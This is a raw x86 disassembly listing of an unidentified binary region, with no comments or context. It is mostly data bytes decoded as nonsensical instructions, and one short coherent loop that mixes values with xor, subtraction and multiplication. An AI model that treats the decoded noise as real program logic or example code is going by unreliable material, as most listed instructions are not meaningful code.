  42129e:	mov    ecx,0x84903798
  4212a3:	sar    BYTE PTR [ecx+0x39fff068],0xb6
  4212aa:	aam    0x8b
  4212ac:	cmp    ebp,DWORD PTR [esi+eiz*4-0x19f7a652]
  4212b3:	push   edi
  4212b4:	or     edx,DWORD PTR [edx+edi*1+0xe769376]
  4212bb:	iret   
  4212bc:	sbb    al,0xf8
  4212be:	xchg   esi,eax
  4212bf:	xchg   ecx,eax
  4212c0:	fwait
  4212c1:	mov    WORD PTR [edi],?
  4212c3:	dec    eax
  4212c4:	scas   eax,DWORD PTR es:[edi]
  4212c5:	push   0x1d
  4212c7:	rcl    bh,1
  4212c9:	lock pop ebp
  4212cb:	cmc    
  4212cc:	pop    ebx
  4212cd:	and    ch,BYTE PTR [esi*4-0x2c8cf736]
  4212d4:	mov    eax,0xae588d95
  4212d9:	fst    DWORD PTR [edi-0x66e6e910]
  4212df:	pusha  
  4212e0:	sahf   
  4212e1:	inc    ebp
  4212e2:	adc    DWORD PTR [ebx-0x2a],0x7b
  4212e6:	dec    eax
  4212e7:	fsubrp st(6),st
  4212e9:	inc    ebx
  4212ea:	add    eax,0xf919e9c7
  4212ef:	inc    eax
  4212f0:	lods   eax,DWORD PTR ds:[esi]
  4212f1:	push   0x85a3bcae
  4212f6:	push   eax
  4212f7:	push   ss
  4212f8:	leave  
  4212f9:	sub    cl,BYTE PTR [eax-0x7316ba31]
  4212ff:	adc    eax,0xc61580a5
  421304:	dec    edi
  421305:	cwde   
  421306:	sbb    al,0x5a
  421308:	test   eax,0xd4f9d957
  42130d:	dec    edx
  42130e:	out    0x32,al
  421310:	mov    edi,cs
  421312:	lahf   
  421313:	mov    esp,0x96e02b3d
  421318:	cmp    DWORD PTR [ecx],ecx
  42131a:	aaa    
  42131b:	dec    eax
  42131c:	shl    cl,0x7
  42131f:	jne    0x421365
  421321:	pop    ebp
  421322:	jno    0x421329
  421324:	arpl   cx,dx
  421326:	mov    eax,0x1d2d0a78
  42132b:	outs   dx,DWORD PTR ds:[esi]
  42132c:	addr16 and eax,0x6404f571
  421332:	xchg   edi,eax
  421333:	push   0xffffff8d
  421335:	out    0xfd,eax
  421337:	push   ebp
  421338:	aad    0xaa
  42133a:	cli    
  42133b:	popf   
  42133c:	mov    DWORD PTR [edi-0x36],esp
  42133f:	mov    ds,WORD PTR [eax]
  421341:	stc    
  421342:	fdivr  QWORD PTR [ebp-0x53244b41]
  421348:	vpsubsb ymm7,ymm0,YMMWORD PTR [ebp-0xf]
  42134d:	adc    al,0x60
  42134f:	xor    BYTE PTR [edi-0x756ae7d3],ch
  421355:	inc    edi
  421356:	daa    
  421357:	pop    ds
  421358:	sub    DWORD PTR [edi],0x5f
  42135b:	imul   ecx,DWORD PTR [edx+0x2f27a43f],0xcd599a02
  421365:	xor    edi,DWORD PTR [edx]
  421367:	push   esi
  421368:	sbb    BYTE PTR [ebp-0x7787a4f4],al
  42136e:	loop   0x421366
  421370:	mov    edx,0x705ffcf9
  421375:	mov    ds:0xe9594370,al
  42137a:	jne    0x42134c
  42137c:	mov    eax,0x3fec1b32
  421381:	cmp    DWORD PTR [esi],0x50
  421384:	je     0x4213f8
  421386:	cs iret 
  421388:	in     eax,0xf7
  42138a:	jp     0x421342
  42138c:	add    dl,bh
  42138e:	sub    al,0xa8
  421390:	lgs    ebp,FWORD PTR [eax-0x20]
  421394:	clc    
  421395:	xchg   ebx,eax
  421396:	iret   
  421397:	dec    ebx
  421398:	add    al,0x80
  42139a:	jmp    0x421375
  42139c:	push   cs
  42139d:	push   ebx
  42139e:	dec    eax
  42139f:	dec    esi
  4213a0:	push   ds
  4213a1:	or     al,0xcd
  4213a3:	test   eax,0xdb093dc7
  4213a8:	das    
  4213a9:	popf   
  4213aa:	or     ebp,DWORD PTR [eax]
  4213ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ae:	or     DWORD PTR [esi],ecx
  4213b0:	xor    dh,0x5f
  4213b3:	adc    cl,BYTE PTR [ebx]
  4213b5:	dec    ebp
  4213b6:	test   al,0x1a
  4213b8:	dec    edx
  4213b9:	and    esp,eax
  4213bb:	pop    es
  4213bc:	xchg   edx,eax
  4213bd:	sub    al,0xeb
  4213bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213c0:	aas    
  4213c1:	or     ebx,eax
  4213c3:	jmp    0x4213ac
  4213c5:	retf   
  4213c6:	xchg   ebx,edx
  4213c8:	xor    ah,BYTE PTR ds:0x586529d2
  4213ce:	loope  0x421415
  4213d0:	or     edi,DWORD PTR [ecx-0x7a]
  4213d3:	ss add eax,0xc123b2fc
  4213d9:	imul   DWORD PTR [edi-0x30fdb657]
  4213df:	dec    ebp
  4213e0:	leave  
  4213e1:	mov    eax,0xe709094
  4213e6:	mov    dh,0x19
  4213e8:	mov    DWORD PTR [esi],esp
  4213ea:	or     DWORD PTR [ecx-0x7e],edi
  4213ed:	or     DWORD PTR [eax+0x596d94c5],esp
  4213f3:	sahf   
  4213f4:	fadd   QWORD PTR [esi]
  4213f6:	mov    dl,0xee
  4213f8:	and    dl,BYTE PTR [edi+0x20]
  4213fb:	xchg   ebx,eax
  4213fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213fd:	sbb    BYTE PTR [ebp-0x15],0x2a
  421401:	push   0x37ee1591
  421406:	imul   ebp,DWORD PTR [ecx-0x33],0x3b
  42140a:	mov    DWORD PTR [eax-0x7416d3e5],ebp
  421410:	dec    ebp
  421411:	or     BYTE PTR [ebx],dh
  421413:	enter  0xce03,0xf
  421417:	test   DWORD PTR [ebx-0x24],esp
  42141a:	(bad)  
  42141b:	(bad)  
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xaa9a88e2
  42147c:	fcomp  DWORD PTR [ebp+0x1cd77]
  421482:	bound  eax,QWORD PTR [eax]
  421484:	add    BYTE PTR [eax],al
  421486:	and    bh,BYTE PTR [ebx*4+0x596d8685]
  42148d:	jb     0x42142e
  42148f:	dec    esi
  421490:	sbb    DWORD PTR [ecx],edx
  421492:	out    0xed,eax
  421494:	(bad)  
  421495:	aad    0xd1
  421497:	or     eax,0x30eebba7
  42149c:	push   0x94c4d45f
  4214a1:	mov    eax,0x72856b02
  4214a6:	clc    
  4214a7:	aas    
  4214a8:	push   edx
  4214a9:	jg     0x421435
  4214ab:	inc    esp
  4214ac:	jae    0x4214be
  4214ae:	mov    cl,0x23
  4214b0:	leave  
  4214b1:	outs   dx,BYTE PTR ds:[esi]
  4214b2:	(bad)  
  4214b3:	nop
  4214b4:	xor    al,bl
  4214b6:	ins    BYTE PTR es:[edi],dx
  4214b7:	mov    eax,ds:0x758def4b
  4214bc:	ret    0xc932
  4214bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214c0:	fiadd  DWORD PTR [ebx-0x78]
  4214c3:	xor    al,al
  4214c5:	or     dl,0x37
  4214c8:	pop    edi
  4214c9:	inc    esi
  4214ca:	mov    eax,0xaeaf9de7
  4214cf:	push   0xffffff84
  4214d1:	(bad)  
  4214d2:	jle    0x421535
  4214d4:	mov    ds:0xbee75b33,al
  4214d9:	mov    al,0x42
  4214db:	add    BYTE PTR [esi],ah
  4214dd:	in     eax,dx
  4214de:	ror    DWORD PTR [edi],0x7a
  4214e1:	xchg   ebp,eax
  4214e2:	daa    
  4214e3:	lods   eax,DWORD PTR ds:[esi]
  4214e4:	sar    BYTE PTR [esi],1
  4214e6:	add    ebx,ebx
  4214e8:	add    BYTE PTR [eax],al
  4214ea:	add    BYTE PTR [eax],al
  4214ec:	add    BYTE PTR [eax],al
  4214ee:	shr    DWORD PTR [esp+edx*1],1
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x89fe62e7
  4214fe:	fxch   st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	bound  eax,QWORD PTR [eax]
  421504:	add    BYTE PTR [eax],al
  421506:	sbb    BYTE PTR [ebp+0x105388b],bl
  42150c:	(bad)  
  42150e:	add    BYTE PTR [ebx-0x13e228b],bh
  421514:	retf   0x226e
  421517:	and    BYTE PTR [ebp+0x11],dl
  42151a:	jge    0x421526
  42151c:	jmp    0x4214ef
  42151e:	ficom  DWORD PTR [esi+0xb4adaa2]
  421524:	lock xchg edx,eax
  421526:	sar    DWORD PTR [ebp-0x3],cl
  421529:	mov    bh,0xc2
  42152b:	xchg   DWORD PTR [edi+ebx*1],esi
  42152e:	iret   
  42152f:	aam    0x13
  421531:	enter  0xda4c,0xcd
  421535:	sbb    ah,BYTE PTR [edi]
  421537:	bnd jge 0x421531
  42153a:	mov    bh,BYTE PTR [eax+0xa]
  42153d:	sub    al,0xa4
  42153f:	push   ss
  421540:	and    BYTE PTR [eax+0x7e],bh
  421543:	xchg   esi,eax
  421544:	jbe    0x42158e
  421546:	ss and ebp,ecx
  421549:	add    al,0xef
  42154b:	mov    esi,0xfeeeab17
  421550:	pop    ebx
  421551:	(bad)  
  421552:	inc    eax
  421553:	rcl    BYTE PTR [ebx+0x23260c4e],1
  421559:	fs sub eax,ebp
  42155c:	pop    edx
  42155d:	enter  0x5593,0xc5
  421561:	and    DWORD PTR [ebp+0x5],0xffffff8b
  421565:	add    eax,0xd21a
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x74a2a10],0x3b
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	bound  eax,QWORD PTR [eax]
  421584:	add    BYTE PTR [eax],al
  421586:	jae    0x42153c
  421588:	mov    bl,BYTE PTR [ebx+ecx*4-0x45]
  42158c:	repnz mov ds,WORD PTR [edx-0x72a13deb]
  421593:	or     eax,0x419c49b4
  421598:	xor    cl,BYTE PTR [eax+edi*4-0x55]
  42159c:	sub    DWORD PTR [ebp+0x46],0x57
  4215a0:	dec    esi
  4215a1:	int    0xd4
  4215a3:	scas   eax,DWORD PTR es:[edi]
  4215a4:	imul   edi,edi,0x56
  4215a7:	jae    0x421535
  4215a9:	inc    ebp
  4215aa:	lods   eax,DWORD PTR ds:[esi]
  4215ab:	test   DWORD PTR [edi+0x50],0x8d8ff16a
  4215b2:	daa    
  4215b3:	add    edi,DWORD PTR [ebx]
  4215b5:	stos   BYTE PTR es:[edi],al
  4215b6:	aas    
  4215b7:	mov    esp,0x1f1a6770
  4215bc:	popf   
  4215bd:	enter  0xc5dc,0xb9
  4215c1:	dec    esi
  4215c2:	in     al,0x8d
  4215c4:	add    BYTE PTR [eax-0x73751cf6],dl
  4215ca:	arpl   WORD PTR [ecx+0x37],si
  4215cd:	div    BYTE PTR [eax-0x68d78285]
  4215d3:	xor    al,0x82
  4215d5:	pop    eax
  4215d6:	xchg   esp,eax
  4215d7:	pushf  
  4215d8:	xchg   ecx,eax
  4215d9:	ds loope 0x421594
  4215dc:	ds mov edx,es
  4215df:	sub    eax,DWORD PTR [edi]
  4215e1:	add    BYTE PTR [esp+ebx*4],dl
  4215e4:	lahf   
  4215e5:	cld    
  4215e6:	cs xchg ecx,eax
  4215e8:	add    BYTE PTR [eax],al
  4215ea:	add    BYTE PTR [eax],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	das    
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	adc    DWORD PTR [esi+edx*4+0x1ce9d07],esp
  421601:	add    BYTE PTR [edx+0x0],ah
  421604:	add    BYTE PTR [eax],al
  421606:	mov    edi,0xb10399bb
  42160b:	retf   0x6b01
  42160e:	out    dx,al
  42160f:	in     al,dx
  421610:	loop   0x42167d
  421612:	sub    DWORD PTR [ebx-0x7c],eax
  421615:	sub    al,BYTE PTR [edi-0x6b]
  421618:	jbe    0x421675
  42161a:	ins    BYTE PTR es:[edi],dx
  42161b:	mov    ah,0xa0
  42161d:	pop    ebx
  42161e:	xabort 0x38
  421621:	in     al,0xb7
  421623:	adc    BYTE PTR [esi-0x6234ff01],bl
  421629:	(bad)  
  42162a:	push   edx
  42162b:	dec    ecx
  42162c:	xchg   esp,eax
  42162d:	mov    ecx,0xdfcfa800
  421632:	sbb    bl,dl
  421634:	jmp    0x421638
  421636:	popf   
  421637:	mov    DWORD PTR [ecx-0x44],esp
  42163a:	arpl   WORD PTR [ebp-0x4d52ffcd],bp
  421640:	dec    esi
  421641:	pop    eax
  421642:	jge    0x421607
  421644:	in     al,dx
  421645:	fwait
  421646:	push   es
  421647:	aam    0x6f
  421649:	sti    
  42164a:	push   ds
  42164b:	mov    dl,0xaf
  42164d:	inc    ecx
  42164e:	icebp  
  42164f:	ret    
  421650:	imul   ebx,DWORD PTR [ebx-0x1f],0xc90f4dc8
  421657:	out    dx,eax
  421658:	daa    
  421659:	sar    DWORD PTR [ecx],1
  42165b:	cdq    
  42165c:	lea    ecx,[ebx+0x67]
  42165f:	imul   esi,DWORD PTR [ecx],0x81db79f8
  421665:	stos   BYTE PTR es:[edi],al
  421666:	ss dec eax
  421668:	add    BYTE PTR [eax],al
  42166a:	add    BYTE PTR [eax],al
  42166c:	add    BYTE PTR [eax],al
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x7f117f28,al
  42167e:	dec    esi
  421680:	add    DWORD PTR [eax],eax
  421682:	bound  eax,QWORD PTR [eax]
  421684:	add    BYTE PTR [eax],al
  421686:	call   0xb209:0xfcc97a97
  42168d:	ret    
  42168e:	imul   BYTE PTR [edx+edx*2]
  421691:	ret    
  421692:	pop    ebx
  421693:	outs   dx,DWORD PTR ds:[esi]
  421694:	add    eax,0x8be02b5
  421699:	or     ch,BYTE PTR [ecx-0x4b]
  42169c:	push   edi
  42169d:	rcr    DWORD PTR [ecx],cl
  42169f:	cmp    bh,BYTE PTR [ebp-0x56]
  4216a2:	cwde   
  4216a3:	xlat   BYTE PTR ds:[ebx]
  4216a4:	aaa    
  4216a5:	push   0xc377accb
  4216aa:	push   ds
  4216ab:	xor    esi,ebp
  4216ad:	aad    0xe7
  4216af:	add    BYTE PTR [ebp+0x50],0x50
  4216b3:	(bad)  
  4216b4:	fisttp QWORD PTR [ecx]
  4216b6:	sti    
  4216b7:	add    ecx,DWORD PTR [edi]
  4216b9:	icebp  
  4216ba:	dec    eax
  4216bb:	jnp    0x421670
  4216bd:	add    al,0x3b
  4216bf:	pop    ecx
  4216c0:	mov    cl,0xb8
  4216c2:	popa   
  4216c3:	out    dx,eax
  4216c4:	cwde   
  4216c5:	inc    edi
  4216c6:	mov    edx,0x441cea4c
  4216cb:	mov    eax,ds:0xbbbdf7a7
  4216d0:	loop   0x42165f
  4216d2:	jmp    0x4216b3
  4216d4:	sbb    DWORD PTR [ebp+0x3cc34b58],ebx
  4216da:	cmp    al,0x90
  4216dc:	jo     0x4216cc
  4216de:	repz test eax,0xd61337c
  4216e4:	jecxz  0x421761
  4216e6:	add    DWORD PTR [ebx+0x0],0x0
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	ret    
  4216fb:	push   esi
  4216fc:	scas   al,BYTE PTR es:[edi]
  4216fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216fe:	popa   
  4216ff:	iret   
  421700:	add    DWORD PTR [eax],eax
  421702:	bound  eax,QWORD PTR [eax]
  421704:	add    BYTE PTR [eax],al
  421706:	aam    0x68
  421708:	mov    edx,0x4ecc014d
  42170d:	retf   
  42170e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42170f:	jge    0x42177f
  421711:	pop    esi
  421712:	push   ss
  421713:	push   ss
  421714:	and    eax,DWORD PTR [esi]
  421716:	cmp    esp,DWORD PTR [edi+0x3]
  421719:	xor    bl,BYTE PTR [ecx+0x2eb51331]
  42171f:	cmp    BYTE PTR [ebx+eiz*1],dh
  421722:	loopne 0x421752
  421724:	test   al,0x45
  421726:	cs out 0xd9,al
  421729:	jb     0x421775
  42172b:	push   ecx
  42172c:	pusha  
  42172d:	jns    0x4216c5
  42172f:	jo     0x4216b1
  421731:	fidiv  DWORD PTR [edi]
  421733:	mov    ebp,0x7826840d
  421738:	mov    bl,0x3c
  42173a:	clc    
  42173b:	and    DWORD PTR [ebx+0x601afad4],eax
  421741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421742:	aaa    
  421743:	cli    
  421744:	lods   eax,DWORD PTR ds:[esi]
  421745:	or     bh,BYTE PTR [ecx-0x29]
  421748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421749:	add    eax,0xd59196fa
  42174e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42174f:	repz int3 
  421751:	stc    
  421752:	sbb    edi,DWORD PTR [edi]
  421754:	mov    esi,DWORD PTR [esi]
  421756:	jmp    0x421732
  421758:	outs   dx,DWORD PTR ds:[esi]
  421759:	pop    ds
  42175a:	(bad)  
  42175b:	idiv   BYTE PTR [ebx+0x71]
  42175e:	mov    edi,0x7d64aff2
  421763:	loope  0x421798
  421765:	dec    esi
  421766:	mov    ch,0xb
  421768:	add    BYTE PTR [eax],al
  42176a:	add    BYTE PTR [eax],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xf66a4e09
  42177b:	aam    0xde
  42177d:	inc    esp
  42177e:	ret    
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	bound  eax,QWORD PTR [eax]
  421784:	add    BYTE PTR [eax],al
  421786:	scas   al,BYTE PTR es:[edi]
  421787:	xchg   ebp,eax
  421788:	ret    0x49e6
  42178b:	inc    edx
  42178c:	fdiv   QWORD PTR [edx+ebx*2]
  42178f:	add    al,0x6d
  421791:	mov    bh,0x93
  421793:	mov    ss,WORD PTR [edi-0x79]
  421796:	fdivr  DWORD PTR [edx-0x6]
  421799:	jg     0x421814
  42179b:	xchg   DWORD PTR [eax-0x3e],ebp
  42179e:	sub    BYTE PTR [esi],dh
  4217a0:	mov    cs,WORD PTR [esi+eiz*2-0x6da52a93]
  4217a7:	pop    ds
  4217a8:	outs   dx,DWORD PTR ds:[esi]
  4217a9:	shl    BYTE PTR [esi+0x30],0x6a
  4217ad:	add    eax,0x7ecb5793
  4217b2:	in     eax,0xac
  4217b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217b5:	pop    esi
  4217b6:	(bad)  
  4217b7:	inc    ecx
  4217b8:	sahf   
  4217b9:	ss in  al,dx
  4217bb:	mov    ecx,0x8229c98e
  4217c0:	cld    
  4217c1:	bnd ja 0x421751
  4217c4:	jno    0x421758
  4217c6:	push   edi
  4217c7:	jecxz  0x42183d
  4217c9:	pop    edi
  4217ca:	fwait
  4217cb:	stc    
  4217cc:	push   esp
  4217cd:	out    0x85,al
  4217cf:	fmul   DWORD PTR [esi-0xb]
  4217d2:	pop    es
  4217d3:	xor    eax,0xa3e090c0
  4217d8:	(bad)  
  4217d9:	jmp    0x421797
  4217db:	inc    ebx
  4217dc:	repz jecxz 0x421788
  4217df:	pop    edx
  4217e0:	pop    edx
  4217e1:	enter  0x533e,0xeb
  4217e5:	cld    
  4217e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217e7:	in     al,dx
  4217e8:	add    BYTE PTR [eax],al
  4217ea:	add    BYTE PTR [eax],al
  4217ec:	add    BYTE PTR [eax],al
  4217ee:	dec    ecx
  4217ef:	inc    esi
  4217f0:	sub    BYTE PTR [eax],dh
  4217f2:	das    
  4217f3:	jle    0x42184e
  4217f5:	jg     0x4217bd
  4217f7:	imul   esi,eax,0xffffffd5
  4217fa:	pop    eax
  4217fb:	fldcw  WORD PTR ds:0x1e2e765
  421801:	add    BYTE PTR [edx+0x0],ah
  421804:	add    BYTE PTR [eax],al
  421806:	inc    ebx
  421807:	pop    eax
  421808:	pop    edx
  421809:	push   es
  42180a:	push   edx
  42180b:	add    ebx,DWORD PTR [esi+0x70]
  42180e:	fs inc esi
  421810:	jmp    FWORD PTR [ebx+ecx*8+0x35a890fb]
  421817:	loopne 0x421841
  421819:	jmp    0x7ae3:0xc523da1e
  421820:	scas   eax,DWORD PTR es:[edi]
  421821:	cmc    
  421822:	imul   esp,edx,0x35
  421825:	fstp   QWORD PTR [esi+esi*1]
  421828:	dec    eax
  421829:	pusha  
  42182a:	inc    esi
  42182b:	leave  
  42182c:	mov    cl,bh
  42182e:	aas    
  42182f:	test   al,0xd
  421831:	mov    dl,dl
  421833:	xor    cl,BYTE PTR [ebx+0x67f1a53a]
  421839:	retf   0xa2d0
  42183c:	in     eax,0x10
  42183e:	(bad)  
  42183f:	lock xor BYTE PTR [eax],al
  421842:	enter  0xff6e,0x3b
  421846:	mov    al,0xbb
  421848:	sbb    eax,DWORD PTR [edx]
  42184a:	ret    0x4e6a
  42184d:	leave  
  42184e:	imul   esp,edi,0xfffffffc
  421851:	xchg   esi,eax
  421852:	in     eax,0x7f
  421854:	mov    edi,0xc4ee8a
  421859:	dec    edi
  42185a:	xchg   ebp,eax
  42185b:	aas    
  42185c:	mov    ds:0x9a74cd0d,eax
  421861:	ins    DWORD PTR es:[edi],dx
  421862:	retf   
  421863:	sub    al,0xa2
  421865:	aam    0x2f
  421867:	popa   
  421868:	add    BYTE PTR [eax],al
  42186a:	add    BYTE PTR [eax],al
  42186c:	add    BYTE PTR [eax],al
  42186e:	addr16 (bad) 
  421870:	and    dh,dh
  421872:	mov    eax,ds:0xe7d7f7f6
  421877:	mov    eax,0xf701da72
  42187c:	iret   
  42187d:	mov    ebp,0x1e349
  421882:	bound  eax,QWORD PTR [eax]
  421884:	add    BYTE PTR [eax],al
  421886:	rol    BYTE PTR [edi+eiz*4-0x5c],1
  42188a:	shl    DWORD PTR [edx+0x1a],cl
  42188d:	mov    al,ds:0xe10920e5
  421892:	and    cl,ah
  421894:	adc    BYTE PTR [eax+0x4d],dh
  421897:	fisttp WORD PTR [edx+eax*1-0x4b63b0f9]
  42189e:	xor    esi,DWORD PTR [eax-0x2dae3aad]
  4218a4:	sbb    al,0x0
  4218a6:	inc    esp
  4218a7:	data16 out dx,al
  4218a9:	jecxz  0x421837
  4218ab:	adc    bl,al
  4218ad:	xchg   BYTE PTR [ecx],bh
  4218af:	call   0xad76d55b
  4218b4:	pop    ds
  4218b5:	mov    bh,0x24
  4218b7:	out    dx,eax
  4218b8:	stc    
  4218b9:	fimul  DWORD PTR [edx+0x53]
  4218bc:	xchg   ebx,eax
  4218bd:	xor    BYTE PTR [esi],ah
  4218bf:	sub    eax,0xdf70d647
  4218c4:	(bad)  
  4218c5:	repz fisttp DWORD PTR [ebx+0x10]
  4218c9:	dec    esi
  4218ca:	xchg   ebp,eax
  4218cb:	out    0x59,al
  4218cd:	pop    es
  4218ce:	add    eax,0xf67f0414
  4218d3:	or     BYTE PTR ds:0x917c5a2d,cl
  4218d9:	mov    ds:0xf6c8755d,al
  4218de:	ret    0x88ba
  4218e1:	stos   DWORD PTR es:[edi],eax
  4218e2:	push   ebx
  4218e3:	sbb    edi,DWORD PTR [ebp+0x50]
  4218e6:	sbb    al,0x41
  4218e8:	add    BYTE PTR [eax],al
  4218ea:	add    BYTE PTR [eax],al
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	ret    
  4218ef:	or     eax,0xefee66a6
  4218f4:	ret    
  4218f5:	lods   eax,DWORD PTR ds:[esi]
  4218f6:	sub    al,0xb8
  4218f8:	mov    ds:0x101a6447,eax
  4218fd:	clc    
  4218fe:	stos   DWORD PTR es:[edi],eax
  4218ff:	jecxz  0x421902
  421901:	add    BYTE PTR [edx+0x0],ah
  421904:	add    BYTE PTR [eax],al
  421906:	mov    eax,ds:0x4d5f1677
  42190b:	test   BYTE PTR [ebp-0x282894b1],0xc8
  421912:	shl    DWORD PTR [ebx],0x7f
  421915:	ins    BYTE PTR es:[edi],dx
  421916:	mov    dh,0xd1
  421918:	dec    edx
  421919:	mov    bh,0xfb
  42191b:	jg     0x421914
  42191d:	int    0x3
  42191f:	mov    bh,0x59
  421921:	adc    BYTE PTR [ebp+0x49f40b58],bh
  421927:	dec    edi
  421928:	out    dx,al
  421929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42192a:	cmp    edi,0x2b
  42192d:	ffreep st(4)
  42192f:	pop    esp
  421930:	sbb    al,0x57
  421932:	adc    ch,al
  421934:	shl    BYTE PTR [edx+0x42],0x32
  421938:	push   ebx
  421939:	imul   ecx,DWORD PTR [edi+0x2109e28c],0x1a
  421940:	dec    esi
  421941:	ret    
  421942:	not    DWORD PTR [ebp+0x50]
  421945:	mov    eax,ds:0x1685cb54
  42194a:	in     al,0xed
  42194c:	ds retf 0x44a8
  421950:	sub    al,0x79
  421952:	loop   0x42191a
  421954:	in     eax,dx
  421955:	js     0x421919
  421957:	shr    BYTE PTR [esi],cl
  421959:	pop    eax
  42195a:	xor    al,0xcf
  42195c:	lods   eax,DWORD PTR es:[esi]
  42195e:	jge    0x421911
  421960:	fwait
  421961:	mov    BYTE PTR ds:0x194532cf,ah
  421967:	mov    ecx,0x0
  42196c:	add    BYTE PTR [eax],al
  42196e:	fld    st(2)
  421970:	add    eax,0xddcf1f49
  421975:	ror    al,cl
  421977:	outs   dx,DWORD PTR ds:[esi]
  421978:	clc    
  421979:	shr    BYTE PTR [edx+0xd7830d4],cl
  42197f:	in     al,0x1
  421981:	add    BYTE PTR [edx+0x0],ah
  421984:	add    BYTE PTR [eax],al
  421986:	mov    eax,0x76a41dbb
  42198b:	stos   DWORD PTR es:[edi],eax
  42198c:	pusha  
  42198d:	ret    
  42198e:	dec    BYTE PTR [esi+0xe]
  421991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421992:	push   ds
  421993:	les    edx,FWORD PTR [eax]
  421995:	call   0xca2895ac
  42199a:	jmp    FWORD PTR [esi-0x6905547b]
  4219a0:	inc    edi
  4219a1:	rcl    ecx,0xeb
  4219a4:	lea    edi,[ecx-0x72351660]
  4219aa:	adc    DWORD PTR [eax-0x5a],edi
  4219ad:	js     0x4219a0
  4219af:	ins    BYTE PTR es:[edi],dx
  4219b0:	xchg   ebx,eax
  4219b1:	push   ds
  4219b2:	lahf   
  4219b3:	xlat   BYTE PTR ds:[ebx]
  4219b4:	mov    edi,0xee3a3ae1
  4219b9:	mov    ebp,0xb8459ce6
  4219be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219bf:	sub    BYTE PTR [edx-0x73],0xf
  4219c3:	add    al,0x8
  4219c5:	ret    
  4219c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219c7:	fimul  DWORD PTR [edx-0x4d095fb1]
  4219cd:	fdivr  DWORD PTR [ebx]
  4219cf:	mov    bh,ah
  4219d1:	sub    eax,0x8ee3ca5f
  4219d6:	shl    BYTE PTR [edx],cl
  4219d8:	adc    DWORD PTR [ebx-0x282c36e9],esp
  4219de:	or     DWORD PTR [ebx+0x67d4fff1],ecx
  4219e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219e5:	mov    ds:0x2381,al
  4219ea:	add    BYTE PTR [eax],al
  4219ec:	add    BYTE PTR [eax],al
  4219ee:	popa   
  4219ef:	pop    edi
  4219f0:	lock (bad) 
  4219f2:	(bad)  
  4219f3:	out    dx,eax
  4219f4:	repz pop edi
  4219f6:	mov    dl,0xc5
  4219f8:	ret    
  4219f9:	in     eax,dx
  4219fa:	xor    DWORD PTR fs:[edx+esi*1],esi
  4219fe:	outs   dx,DWORD PTR ds:[esi]
  4219ff:	in     al,0x1
  421a01:	add    BYTE PTR [ebx],al
  421a03:	add    BYTE PTR [eax],al
